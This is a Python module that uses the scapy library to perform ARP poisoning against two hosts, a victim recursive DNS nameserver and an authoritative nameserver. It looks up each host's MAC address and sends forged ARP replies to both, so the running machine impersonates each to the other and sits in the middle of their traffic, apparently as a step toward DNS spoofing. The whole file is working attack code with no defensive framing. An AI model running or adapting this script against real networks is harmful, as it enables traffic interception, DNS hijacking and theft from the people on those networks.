import utils
from vars import ccolors
from scapy.all import Ether, ARP, sendp, get_if_hwaddr, get_if_list
import sys

def arppoison(ip1, ip2):
    # arp poison the authoritative nameserver and victim (recursive) nameserver
    # get victim nameserver's MAC
    ip1Mac = utils.getMAC(ip1)	
    if ip1Mac is None:
        print(ccolors.FAIL + "Cannot find victim's MAC address!\nTerminating..." + ccolors.NC)
        sys.exit()
    # get authoritative nameserver's MAC
    ip2Mac = utils.getMAC(ip2)
    if ip2Mac is None:
        print(ccolors.FAIL + "Cannot find authoritative nameserver's MAC address!\nTerminating..." + ccolors.NC)
        sys.exit()
    # get host's MAC address
    myMac = None
    myMacs = [get_if_hwaddr(i) for i in get_if_list()]
    for x in myMacs:
        if x != "00:00:00:00:00:00":
            myMac = x
            break
    if not myMac:
        print(ccolors.FAIL + "Cannot find this system's MAC address!\nTerminating..." + ccolors.NC)
        sys.exit()

    # arp poison victim
    arp = Ether() / ARP()
    arp[Ether].src = myMac # Py3: Use our MAC as the source Ethernet MAC
    arp[ARP].hwsrc = myMac
    arp[ARP].psrc = ip2   # We claim to be ip2
    arp[ARP].hwdst = ip1Mac
    arp[ARP].pdst = ip1
    sendp(arp, verbose=False)

    # arp poison authoritative nameserver
    arp[ARP].psrc = ip1   # We claim to be ip1
    arp[ARP].hwdst = ip2Mac
    arp[ARP].pdst = ip2
    sendp(arp, verbose=False)

    print(ccolors.OKGREEN + "Victims ARP poisoned..." + ccolors.NC)